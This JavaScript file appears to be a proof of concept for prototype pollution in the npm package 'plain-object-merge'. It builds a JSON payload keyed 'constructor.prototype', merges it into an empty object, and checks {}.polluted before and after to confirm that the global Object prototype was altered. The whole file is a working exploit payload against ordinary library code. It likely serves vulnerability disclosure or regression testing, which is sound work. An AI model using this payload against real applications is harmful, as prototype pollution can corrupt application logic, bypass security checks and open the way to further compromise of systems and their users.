const merge = require('plain-object-merge');
const payload = JSON.parse('{"constructor.prototype": {"polluted":"yes"}}');
obj = {};
console.log({}.polluted);
merge([
    {},
    payload
]);
console.log({}.polluted);